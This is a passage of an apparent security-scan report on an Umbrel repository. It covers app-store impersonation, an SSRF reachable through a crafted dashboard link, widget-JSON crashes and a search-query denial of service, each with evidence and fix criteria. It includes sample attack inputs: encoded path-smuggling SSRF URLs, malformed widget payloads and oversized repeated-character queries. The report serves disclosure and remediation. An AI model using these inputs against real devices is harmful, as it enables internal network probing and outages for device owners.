7. [packages/ui/src/hooks/use-apps-with-updates.ts:28–33](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/hooks/use-apps-with-updates.ts#L28-L33)
   Update availability is derived solely from availableApps.appsKeyed, which indexRegistryApps strips of every id found in more than one registry. The dashboard never calls the server's apps.updates route and umbreld has no automatic app update, so once the store re-declares official ids (allowed by the prefix bypass) their pending updates vanish from the updates shelf, dialog, header count and dock badge.
8. [packages/ui/src/features/app-store/providers/store-actions.tsx:89–116](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/features/app-store/providers/store-actions.tsx#L89-L116)
   installApp/updateApp (and install-button-connected.tsx:96-99, 129-131) refuse any ambiguous id with the 'app-id-conflict' toast, so the same collision blocks Install and Update of the colliding official apps everywhere in the dashboard.
9. [packages/ui/src/constants/app-store.ts:16–21](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/constants/app-store.ts#L16-L21)
   registryAppPath routes apps whose appStoreId equals 'umbrel-app-store' to /app-store/<id>; CommunityBadge is rendered only by the /community-app-store routes, so the impersonating store's apps are presented as official.
10. [packages/ui/src/components/markdown.tsx:13–17](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/components/markdown.tsx#L13-L17)
   The plain-text safeguard for community content keys on pathname.startsWith('/community-app-store'); the same manifests shown at /app-store/<id> get react-markdown links and headings reserved for the official store.
11. [packages/umbreld/source/modules/apps/app-store.ts:178–185](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/apps/app-store.ts#L178-L185)
   resolvedApps is first-wins by repository order, so an id the official store does not declare resolves to the impersonating store: Install from the official-looking /app-store/<id> page runs that store's template (getAppTemplateFilePath, 244-256) — the owner consents believing the app is official.
12. [packages/umbreld/source/modules/apps/app-repository.integration.test.ts:193–213](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/apps/app-repository.integration.test.ts#L193-L213)
   Documents the intended contract: the community fixture declares `id: sparkles` and its apps carry `appStoreId: 'sparkles'` with the `sparkles-` prefix — a store is expected to be confined to its own id space, which is what the unchecked meta.id defeats.

## Impact
Integrity: the dashboard's provenance signals are falsified (community manifests at official URLs without the badge or plain-text safeguard) and the owner's control over their configured stores is defeated (the store cannot be seen or removed from the UI). Availability: official app pages the store does not re-declare throw 'App not found', and for re-declared ids update visibility and the Install/Update actions are blocked dashboard-wide, so security updates for installed official apps stop being offered. No data is disclosed by these paths. Root on the host via an Install the owner is deceived into is a downstream consequence that depends on an owner click and is not rated here.

## Reproduction steps
1. The attacker controls a community app store git repository the owner has already added (attack requirement outside the attacker's control). They set umbrel-app-store.yml `id` to `umbrel-app-store` (or an empty/short prefix) and may add directories named after official app ids. umbreld re-clones every 5 minutes (AppStore.updateInterval) and the dashboard re-keys its registry model on the next appStore.registry fetch; the impersonation, self-hiding and update suppression need no owner interaction. No device privileges are required; delivery is over the network through the git remote.

## Recommended fix
1. AppRepository.readRegistry() takes a repository's registry identity (`meta.id`) from the repository's own content with no validation, no reservation of the official id and no uniqueness check, and uses that value both for the namespace filter and for the appStoreId the dashboard relies on. Fix criteria: A non-default repository must never be able to present itself as, or replace, the official store: umbreld validates `meta.id` (e.g. `^[a-z0-9-]+$` with a minimum length), rejects `umbrel-app-store` and any id already in use by another repository, or derives the store identity from the repository URL/position rather than its content; appStoreId must come from that derived identity. Verify by adding a store whose umbrel-app-store.yml declares `id: umbrel-app-store`: it must be rejected or listed as a community store with a working Remove button, and `/app-store/<id>` must never render its manifests.
2. The namespace confinement compares app ids against the store's self-declared prefix, so an empty, short or official id lets a community store publish manifests for official app ids, which the dashboard then quarantines as ambiguous — hiding and blocking official updates. Fix criteria: A community store may only publish ids unambiguously namespaced to a validated store id (e.g. `<storeId>-` with a minimum length), and update availability for an installed app must be computed from its origin registry rather than dropped on collision. Verify that a community store re-declaring `bitcoin` neither hides a pending official bitcoin update nor blocks the Update button.
3. The dashboard resolves duplicate registry ids by last-wins indexBy and filters the store-management UI by the declared id, so a repository claiming the official id overrides the official store and disappears from the removal list. Fix criteria: The dashboard must treat every repository that is not the default URL as community regardless of its declared id, list it in the management dialog with its URL and Remove action, and never let a later registry replace an earlier one's key; registry-derived route segments must be path-only (encoded or passed as `{pathname}`). Verify that a store with a duplicate or query-bearing id is listed, removable, and navigates to a path with an empty query string.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Privilege escalation
**CWE:** [CWE-807](https://cwe.mitre.org/data/definitions/807.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258137

---

# Crafted /files/Network/<host:port> link makes the owner's dashboard drive umbreld into a blind GET to an attacker-chosen host (SSRF via isServerAnUmbrelDevice)

## Details
The Files path bar renders a `NetworkDeviceIcon` for the first segment under /Network, and that icon's hook (`useNetworkDeviceType`) immediately queries the owner-only procedure `files.isServerAnUmbrelDevice({address: <segment>})`. The segment is taken from the browser URL (`toFsPath(location.pathname)` in use-navigate.ts), not from the owner's configured network shares (`listNetworkShares`). Server-side, `NetworkStorage.isServerAnUmbrelDevice` performs `GET http://${address}/trpc/system.version` (ky 1.10.0, 1 s timeout) from umbreld's host network namespace with no validation of the address and reduces the response to a boolean.

Reachability: umbreld's SPA fallback (server/index.ts:340) serves index.html for `/files/Network/<anything>`, the Files route's `*` child (routes.tsx:90) mounts the Files shell with the ActionsBar/PathBar, FileItemIcon types the segment `network-share` and renders NetworkDeviceIcon, and React Query fires the probe on mount — before and regardless of whether the directory listing for the host fails. The dashboard authenticates tRPC with a bearer token from localStorage (trpc.ts:36; is-authenticated.ts:14-16 requires the Authorization header), so a classic cross-site <img>/fetch CSRF against the procedure is not possible; the SPA route is what turns the owner-only procedure into a cross-site-reachable primitive: any web page, email or chat message that gets a logged-in owner to open `https://umbrel.local/files/Network/10.21.21.9:8080` (or opens it via window.open/navigation) makes umbreld GET that host and port.

What the attacker controls: host and port (the segment cannot contain '/', but ':' passes); with a percent-encoded `?` (`.../files/Network/192.168.1.1:80%3Fx`) the fixed path is pushed into the query string so the request path becomes `/`; with `%23` the fixed path becomes a fragment. Because the segment is decoded with decodeURIComponent and only '/' is treated as a separator, a percent-encoded backslash (`%5C`) survives into the address, and under WHATWG URL parsing (Node 22 / undici, used by ky) a backslash in a special-scheme authority is a path separator — so `10.21.21.9:8080%5Cadmin%5Caction%3Fx%3D` would yield `GET http://10.21.21.9:8080/admin/action?x=/trpc/system.version`, i.e. full path control (assumption: WHATWG backslash handling in the pinned Node/undici; not verified in the checkout). URL userinfo (`@`) is rejected by fetch and simply returns false.

Impact: a blind, GET-only request from the host network namespace to targets the victim's browser cannot reach — Docker-internal app containers on umbrel_main_network (10.21.21.x), which the app-gateway/app_proxy login normally fronts, loopback services on the device, LAN hosts, or an attacker host (confirming the owner followed the link; refetchOnWindowFocus repeats it). The attacker cannot read the response (only a true/false 'contains umbrel' icon in the victim's UI). Members cannot be used as triggers (hook disabled for members; procedure owner-only).

The ledger's dismissal `dismissed-network-storage-337-0603` judged the server sink owner-only and therefore trusted; this finding adds the reachable path that dismissal did not consider. The missing control is on both sides: the server should validate/allow-list the address (sufficient alone), and the UI should only probe hosts present in the owner's share configuration.

## Evidence
1. [packages/umbreld/source/modules/files/network-storage.ts:334–341](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/network-storage.ts#L334-L341)
   isServerAnUmbrelDevice interpolates the caller-supplied address straight into `http://${address}/trpc/system.version` and fetches it with ky (1.10.0, 1 s timeout) from umbreld's host network namespace. There is no allow-list against configured network shares, no host/port/character validation and no private-range or loopback check; the response is reduced to a boolean. This is the sink the fix must harden.
2. [packages/umbreld/source/modules/files/routes.ts:504–506](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/routes.ts#L504-L506)
   The procedure is owner-only (privateProcedure) and accepts any z.string() address. Owner-only is why the sink alone was dismissed; the UI path below lets an unauthenticated cross-site attacker drive the owner's own authenticated session into calling it.
3. [packages/ui/src/features/files/hooks/use-network-device-type.ts:15–52](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/features/files/hooks/use-network-device-type.ts#L15-L52)
   extractHostnameFromPath returns the second segment of any /Network/<x> path verbatim, and useNetworkDeviceType runs trpcReact.files.isServerAnUmbrelDevice.useQuery({address}) as soon as the hook mounts for any non-member session (enabled: !!hostname && !isMember, refetchOnWindowFocus: true). The segment is never checked against the owner's configured network shares.
4. [packages/ui/src/features/files/hooks/use-navigate.ts:21–44](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/features/files/hooks/use-navigate.ts#L21-L44)
   toFsPath derives the Files path from decodeURIComponent(location.pathname) with the /files prefix stripped, so whatever follows /Network/ in the browser URL becomes the host segment, including ':port' and percent-encoded '?', '#', '@' or '\' characters that survive into the segment because only '/' is used as a separator.
5. [packages/ui/src/features/files/components/listing/actions-bar/path-bar/path-bar-desktop.tsx:134–141](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/features/files/components/listing/actions-bar/path-bar/path-bar-desktop.tsx#L134-L141)
   Breadcrumb segments are derived from the current UI path; for any path under /Network the first nested segment is typed 'network-share', and PathSegmentContent (lines 321-339) renders a FileItemIcon for it with path `/Network/<segment>`. path-bar-mobile.tsx (lines 57-77) does the same on mobile viewports.
6. [packages/ui/src/features/files/components/shared/file-item-icon/index.tsx:198–200](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/features/files/components/shared/file-item-icon/index.tsx#L198-L200)
   FileItemIcon routes 'network-share' items to NetworkDeviceIcon (lines 449-452), which calls useNetworkDeviceType(path); the tRPC probe is therefore triggered purely by rendering the path bar for the URL, before and independently of the directory listing's result.
7. [packages/ui/src/features/files/routes.tsx:90–93](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/features/files/routes.tsx#L90-L93)
   The Files route's '*' child renders DirectoryOrTrashListing for any /files/<anything> URL, so /files/Network/<attacker-segment> mounts the Files shell (index.tsx lines 103-107: ActionsBar with the path bar) without the host having to exist.
8. [packages/umbreld/source/modules/server/index.ts:339–342](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/server/index.ts#L339-L342)
   SPA fallback: every unmatched GET, including /files/Network/<segment>, is answered with the dashboard index.html, so a top-level navigation from a third-party page lands in the Files route.
9. [packages/ui/src/trpc/trpc.ts:35–36](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/trpc/trpc.ts#L35-L36)
   The dashboard authenticates tRPC calls with a bearer token read from localStorage (is-authenticated.ts:14-16 requires the Authorization header; no cookie-only auth), so a cross-site <img>/fetch cannot call the owner-only procedure directly — but once the victim's browser performs a top-level navigation to the device origin, the SPA itself reads the token and sends the attacker-chosen address.

## Impact
umbreld itself discloses nothing to the attacker (the response is reduced to a boolean shown only in the victim's UI), its state is not modified, and one 1 s GET per render/focus has no availability effect on the daemon. Subsequent-system impact: The forged request crosses the device's trust boundaries toward hosts the attacker names: Docker-internal app containers reachable only from the host (bypassing the app-gateway/app_proxy login), loopback services, and LAN devices. It is a blind GET — host and port chosen by the attacker, path '/' or the fixed '/trpc/system.version' (full path control only under the WHATWG-backslash assumption) — so only GET-triggered side effects on unauthenticated internal endpoints are achievable; no response data reaches the attacker.

## Reproduction steps
1. Attacker: any remote web page, email or chat message (unauthenticated, off-device) that supplies a link to the device's dashboard at /files/Network/<host:port[%3F|%5C...]>. A logged-in owner opens it (UI:P — a link click or a hostile page navigating a tab); the SPA fallback serves the dashboard, the Files '*' route mounts the path bar, NetworkDeviceIcon → useNetworkDeviceType sends the authenticated tRPC query with the attacker's segment, and umbreld performs the GET from the host network namespace. No secret or privilege is needed; the owner's existing session in that browser supplies authorisation. No race, no special configuration: the Files feature and the probe are default behaviour of the shipped dashboard.

## Recommended fix
1. isServerAnUmbrelDevice fetches http://<address>/... with no validation of the caller-supplied address, so any reachable host:port (and, via encoded separators, path) can be targeted from the host network namespace. Fix criteria: The server must accept only a bare hostname/IP with optional port that matches a configured or discovered network-share host, rejecting userinfo, query/fragment, backslash and other non-host characters, and must not issue a request for anything else. Verify that addresses like 127.0.0.1:22080, 10.21.21.9:8080%3Fx or host%5Cpath are rejected without a network request.
2. The UI probes the device type for whatever host segment appears in the browser URL, so an attacker-controlled link decides which address the owner's session asks umbreld to contact. Fix criteria: The dashboard must only request isServerAnUmbrelDevice for hosts present in the owner's listNetworkShares configuration (or server-discovered hosts), never for an arbitrary URL segment. Verify that visiting /files/Network/<unknown-host:port> produces no tRPC probe.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Server-side request forgery
**CWE:** [CWE-918](https://cwe.mitre.org/data/definitions/918.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** LOW
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258134

---

# App-controlled widget JSON rendered unvalidated crashes the whole dashboard for the account

## Details
The dashboard renders live widget data from third-party app containers without validating its shape and without any error boundary around the widget, and the widget tree is part of the root route element. A single malformed field in the app's widget JSON therefore crashes the entire dashboard SPA for every account that has that widget enabled, on every route, persistently.

Path: `App.getWidgetData` (umbreld, app.ts:2817-2841) fetches `http://<container>/<endpoint>` and returns `response.json()` verbatim; `widget.data` (widgets/routes.ts:139-151) forwards it with only `refresh` rewritten. In the UI, `Widget` (modules/widgets/index.tsx:86-112) casts `widgetQ.data` to `WidgetConfig` and spreads it into the component selected by the manifest `type`. The components render fields straight into JSX (`StatText` title/value, list text, four-stats title/text, etc.) and call string/array methods on them (`limitToOneEmoji` -> `.match`, `items.slice().map`, `take(buttons,3)`). Any value of an unexpected type — e.g. `{"title": {}, "refresh": "5m"}` for a text-with-progress widget, or `{"items":[{"emoji":1}], "refresh":"5m"}` for list-emoji — throws during render (React: 'Objects are not valid as a React child'; TypeError: match is not a function).

Nothing catches it near the widget: `desktopWidgetNode` (desktop-content.tsx:53-78) mounts `<Widget>` bare, and `<Desktop />` lives in the root `/` route element (router.tsx:59-97) that every child route (settings, files, photos, app-store, edit-widgets) renders beneath. The nearest boundary is the root `ErrorBoundaryPageFallback`, so the whole dashboard is replaced by the 'Something went wrong' dialog. Its only action, `navigate('/')`, re-mounts the same tree; the tRPC query returns the cached (module-singleton `queryClient`) or re-fetched identical payload and the render throws again. Dock links to /settings etc. hit the same root element. The owner cannot reach app settings, the widget editor or the uninstall flow through the UI while the app keeps answering that way; recovery requires SSH/CLI, or waiting for the app to change its response. A member account that enabled a shared app's widget has no recovery path at all until the owner intervenes.

The maintainers clearly expected malformed app widget data: the widget selector wraps each manifest `ExampleWidget` in `<ErrorBoundary fallback={null}>` (widget-selector.tsx:228-239), but the live desktop widget and the selected-widget carousel are unguarded, and neither umbreld nor the UI validates the live payload against the documented widget schema.

Attacker: the author of an app in a community app store the owner added, or anyone who has compromised a running app container (apps are LAN-exposed services). The threat model lists app containers as adversaries and app <-> host/dashboard as a boundary. The attack needs no umbreld credentials and no click: the crash happens on the dashboard's normal load/poll. Precondition: the victim account has enabled one of that app's widgets. This is distinct from the recorded `app-manifest-path-and-widget-link-javascript-url-dashboard-xss` (window.open destination); the sink here is the React render of widget content and the impact is availability of the management UI.

## Evidence
1. [packages/ui/src/modules/widgets/index.tsx:86–111](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/modules/widgets/index.tsx#L86-L111)
   `widget` is `widgetQ.data` cast to WidgetConfig with no runtime validation and spread as props into the widget component chosen by the manifest's `type`. Every field (title, text, subtext, items[], buttons[], emoji, count, noItemsText) is whatever the app container answered.
2. [packages/ui/src/modules/desktop/desktop-content.tsx:53–77](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/modules/desktop/desktop-content.tsx#L53-L77)
   `desktopWidgetNode` mounts `<Widget>` for each enabled widget of a ready app with no ErrorBoundary; the node is rendered by DesktopContent on every dashboard route (the variant only changes opacity), so a throw during Widget render propagates up to the route's boundary.
3. [packages/ui/src/router.tsx:59–96](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/router.tsx#L59-L96)
   `<Desktop />` (which renders DesktopContent and therefore the live widgets) is part of the root `/` route *element*, shared by every child route (settings, files, app-store, edit-widgets). The only boundary above it is `ErrorBoundary: ErrorBoundaryPageFallback` on the root route, so a widget render error replaces the entire dashboard, not just the widget.
4. [packages/ui/src/components/ui/error-boundary-page-fallback.tsx:58–65](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/components/ui/error-boundary-page-fallback.tsx#L58-L65)
   The fallback's only recovery action is `navigate('/')`, which re-mounts the root element; `trpcReact.widget.data.useQuery` returns the same payload from the module-singleton query cache (trpc/query-client.ts, staleTime 1 min) or refetches it from the same container, so the render throws again immediately. Dock links to other routes re-mount the same element and fail the same way.
5. [packages/ui/src/modules/widgets/shared/stat-text.tsx:9–11](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/modules/widgets/shared/stat-text.tsx#L9-L11)
   Renders `title`, `value`, `valueSub` directly as React children. A JSON value such as `"title": {}` or `"text": {"a":1}` makes React throw 'Objects are not valid as a React child' during render — a deterministic exception, not a swallowed warning.
6. [packages/ui/src/modules/widgets/list-emoji-widget.tsx:41–55](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/modules/widgets/list-emoji-widget.tsx#L41-L55)
   `limitToOneEmoji(item?.emoji ?? '')` calls `.match` on the value; a non-string `emoji` (number, object, array) throws TypeError during render. Similar unguarded assumptions exist for `items`/`buttons` being arrays (list-widget.tsx `items.slice(...).map`, text-with-buttons-widget.tsx `take(buttons,3).map`).
7. [packages/ui/src/routes/edit-widgets/widget-selector.tsx:228–238](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/routes/edit-widgets/widget-selector.tsx#L228-L238)
   The maintainers wrap each manifest-driven `ExampleWidget` in `<ErrorBoundary fallback={null}>` — they anticipated malformed app-supplied widget data in the selector but left the live `<Widget>` on the desktop (and the selected-widget carousel at line 200 of this file) unguarded.
8. [packages/umbreld/source/modules/widgets/routes.ts:139–150](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/widgets/routes.ts#L139-L150)
   `widget.data` returns the app container's JSON verbatim (only `refresh` is rewritten through `ms()`); no shape validation of title/text/items/buttons happens server-side.
9. [packages/umbreld/source/modules/apps/app.ts:2817–2840](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/apps/app.ts#L2817-L2840)
   `getWidgetData` does `fetch(url)` against the app's container and returns `response.json()` as-is, so the container (third-party app author, or whoever has compromised the running container) controls every field the dashboard renders.

## Impact
No data is read or altered. The dashboard SPA — the management plane for apps, files, photos, settings and the widget editor — becomes unusable on every route for the affected account for as long as the app keeps responding that way; the owner must fall back to SSH/CLI to stop or uninstall the app, and a member has no recovery path until the owner acts. umbreld itself, installed apps and the API remain reachable, so availability is rated LOW for the system as a whole rather than HIGH.

## Reproduction steps
1. A third-party app (community-store author, or a container compromised at runtime through its own LAN-exposed service) answers umbreld's widget GET with JSON whose text/title/emoji/items fields have non-string/non-array types while still carrying a valid `refresh` string (the only server-side gate: widgets/routes.ts:149 `ms(widgetData.refresh)` throws on a missing/invalid value, which would make the UI show the error placeholder instead). Every account that has enabled that app's widget loads the dashboard, umbreld relays the payload, and the widget component throws during render: `{"title":{},"refresh":"5m"}` for text-with-progress reaches StatText's `{title}` child (React 19 rejects object children with a thrown error), `{"items":[{"emoji":1}],"refresh":"5m"}` for list-emoji reaches `limitToOneEmoji` -> `(1).match` TypeError. No boundary exists between `<Widget>` and the root route's `ErrorBoundaryPageFallback` (desktop-content.tsx, WidgetWrapper, AppGrid, DesktopContextMenu, layouts/desktop.tsx carry none), and `<Desktop />` is outside the `<Outlet />`, so child-route boundaries cannot catch it. The fallback's Dock targets (/, /app-store, /files, /photos, /settings, /machines, /edit-widgets, ?dialog=live-usage) are all under the root `/` route, so every navigation re-renders the same element; react-router-dom ^6.30.3's RenderErrorBoundary resets on location change (assumed from its documented data-router behaviour), the module-singleton query cache (staleTime 1 min) hands back the same payload, and a refetch or full reload gets it again from the container. No victim interaction is needed beyond opening the dashboard; the only requirement is that the widget was enabled (an owner- or member-side configuration state), so AT is PRESENT. The attacker holds no umbreld privilege. Dependency assumptions: react ^19.0.0 throws 'Objects are not valid as a React child' during reconciliation; ms ^2.1.3 parses '5m' to 300000.

## Recommended fix
1. Live widget payloads from app containers are rendered without runtime validation of their shape, so a type mismatch becomes an exception in React render. Fix criteria: Widget data must be validated against a per-type schema (strings for text fields, bounded arrays of the expected item shape, numbers for progress) before rendering — in umbreld's `widget.data` and/or in the UI — with invalid payloads producing the widget's loading/error state. Verify that a container answering `{"title":{},"refresh":"5m"}` or `{"items":[{"emoji":1}],"refresh":"5m"}` leaves the dashboard fully usable and shows a placeholder or error widget.
2. The live `<Widget>` on the desktop (and in the edit-widgets carousel) has no error boundary, and the desktop sits in the root route element, so one widget's render error unmounts the entire dashboard on every route. Fix criteria: Each live widget is isolated by an error boundary that renders a per-widget fallback (as the selector already does for examples) so a failing widget cannot take down the desktop, dock or other routes; after a widget throws, navigating to /settings or /edit-widgets must still work and the user must be able to disable the widget or stop the app from the UI.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Improper input validation
**CWE:** [CWE-1287](https://cwe.mitre.org/data/definitions/1287.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258133

---

# Unbounded Files search query drives quadratic fuzzy scoring and FTS work on the reader

## Details
The Files search pipeline accepts a search query of unbounded length from any authenticated account (owner or non-owner member) and performs work on the shared file-index reader that is proportional to that length multiplied by the number of candidate rows, with no execution deadline and no admission bound.

Path: `files.search` (routes.ts:453, privateProcedureWithMembers) validates `query` only as a NUL-free `z.string()` while capping `maxResults` at 1000; `Search.search` passes it to `fileIndex.searchCandidates`; the index worker (`file-index-worker.ts` case 'searchCandidates') only type-checks it; `FileIndexEngine.searchCandidates` checks NUL and `maxResults`; the reader pool dispatches `fileIndexQueries.searchCandidates` to the single shared bulk-lane reader (reader-pool.ts, reader.ts:44).

In `queries.ts`: `searchRowPhases` yields up to candidateLimit (= min(10000, max(1000, 4*maxResults)) = 4000 at maxResults=1000) rows per phase from the FTS5 trigram table; `ftsSubstringRows` runs `LIKE '%<query>%'` over the trigram detail=none table; and for every candidate row of every phase `fuzzy(query, row.name)` from fast-fuzzy 1.12.0 computes a Sellers edit-distance that is O(|query| x |name|) in time (and, as that library is understood to allocate the full (|query|+1)x(|name|+1) row matrix, in memory).

A query such as 'a'.repeat(N) de-duplicates to the single trigram 'aaa', so every file in the caller's own home whose name contains 'aaa' (members may create directories and rename files in their home, so they control these names) becomes a candidate in both the conjunction and rare-trigram phases, each scored against the full-length query. Over the tRPC WebSocket (`/trpc`, 1 MiB `maxPayload`, proxied by lan-ingress; members may mint a 'trpc' ticket via `user.createWebSocketTicket`) N can be ~1,000,000, giving on the order of 10^8 DP cells per row and 10^12 per request (hours of CPU on one thread, or a worker OOM crash after allocating gigabytes if the full matrix is materialised); over HTTP GET N is ~16,000, still tens of seconds of CPU per request.

Because `FileIndexReaderPool#run` has no execution timeout and the pool never rejects queued reads (reader-pool.ts:101-105), one such request holds the only bulk-lane reader for its whole duration and an attacker can enqueue an arbitrary backlog; every other bulk read (owner's Files search, Photos summary/listAlbums/listSources, index entry count) waits indefinitely behind it. The reserved interactive reader (thumbnails, point reads), file listing, the dashboard and apps keep working.

Assumptions: fast-fuzzy 1.12.0 (package-lock) implements `fuzzy()` with a full (|term|+1)x(|candidate|+1) Sellers matrix; SQLite FTS5 (bundled with better-sqlite3 12.11.1) rewrites LIKE patterns on trigram detail=none tables into one AND term per trigram of the pattern. Neither could be verified in the checkout; the CPU-time claim holds under any O(|query| x |name|) implementation.

## Evidence
1. [packages/umbreld/source/modules/files/file-index/queries.ts:36–41](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index/queries.ts#L36-L41)
   For every candidate row of every search phase, `fuzzy(query, row.name)` (fast-fuzzy 1.12.0) is evaluated with the raw client query. The Sellers edit-distance scoring is O(|query| x |name|) per row; up to candidateLimit (4000 for maxResults=1000) rows per phase across the substring, conjunction and rare-trigram phases, on a single reader thread with no execution deadline.
2. [packages/umbreld/source/modules/files/routes.ts:453–461](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/routes.ts#L453-L461)
   `files.search` is member-accessible (privateProcedureWithMembers) and validates `query` only as a NUL-free `z.string()`; `maxResults` is capped at 1000 (and a vm test enforces that cap) but the query length is unbounded.
3. [packages/umbreld/source/modules/files/file-index/queries.ts:190–245](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index/queries.ts#L190-L245)
   `searchRowPhases` applies no length cap: `queryTrigrams` materialises every code point and trigram, `ftsSubstringRows` passes the whole query as a LIKE pattern over the FTS5 trigram detail=none table (migrations.ts:192-197), and the conjunction/rare-trigram phases each yield up to candidateLimit rows. A repeated-character query collapses to one trigram, so every file in the caller's home whose name contains it becomes a candidate while the query stays at maximum length.
4. [packages/umbreld/source/modules/files/file-index-engine.ts:2052–2064](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-engine.ts#L2052-L2064)
   The engine forwards the query to the reader pool (`#readFiles('searchCandidates', ...)`) after checking only for NUL and a positive maxResults; no length limit or timeout is applied.
5. [packages/umbreld/source/modules/files/file-index/reader-pool.ts:152–170](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index/reader-pool.ts#L152-L170)
   `#run` awaits `job.result.promise` with no execution timeout (only the snapshot handshake is bounded at 10 s). `searchCandidates` is a bulk-lane job (reader.ts:44); with the default pool (size 2, one reserved interactive slot) a single shared slot serves all bulk reads, so one long-running search blocks Files search, Photos summary/listAlbums/listSources and index status for every account until it finishes.
6. [packages/umbreld/source/modules/files/file-index/reader-pool.ts:101–104](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index/reader-pool.ts#L101-L104)
   The pool deliberately bounds execution with worker slots, not admission: queued reads are never rejected, so an attacker can enqueue an unbounded backlog of pathological searches that keeps the shared bulk reader busy long after they stop sending.
7. [packages/umbreld/source/modules/server/index.ts:43](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/server/index.ts#L43)
   tRPC is also served over WebSocket (`/trpc`, proxied by lan-ingress with `ws: true`) with a 1 MiB payload cap, so a single request can carry a ~1,000,000-character query; the HTTP GET path still admits ~16 KB.
8. [packages/umbreld/source/modules/user/routes.ts:249–252](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/user/routes.ts#L249-L252)
